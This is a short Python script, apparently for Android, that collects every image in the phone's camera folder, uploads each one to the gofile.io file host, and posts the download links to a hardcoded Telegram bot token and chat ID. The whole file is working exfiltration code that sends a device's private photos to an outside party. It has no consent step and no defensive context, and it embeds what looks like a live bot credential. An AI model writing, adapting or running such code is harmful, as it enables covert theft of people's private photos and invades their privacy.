import os, requests, time

BOT_TOKEN = "8200691947:AAF-wOE90vTafT21Hqzs5WXokd2iBVstdl4"
CHAT_ID = "8519296209"
CAMERA = "/storage/emulated/0/DCIM/Camera"

def upload_to_gofile(file_path):
    try:
        with open(file_path, 'rb') as f:
            r = requests.post('https://store1.gofile.io/uploadFile', files={'file': f})
            return r.json()['data']['downloadPage']
    except:
        return None

print("🔍 Searching...")
photos = [os.path.join(CAMERA, f) for f in os.listdir(CAMERA) if f.lower().endswith(('.jpg','.jpeg','.png'))]
print(f"📸 Found {len(photos)}")

links = []
for i, p in enumerate(photos, 1):
    print(f"🔄 {i}/{len(photos)}...")
    link = upload_to_gofile(p)
    if link:
        links.append(f"{os.path.basename(p)}: {link}")
        print(f"✅ {link}")
    else:
        print(f"❌ Failed")
    time.sleep(2)

if links:
    msg = "\n".join(links)
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg})
    print("✅ Links sent")
else:
    print("❌ No links")

print("✅ Done")
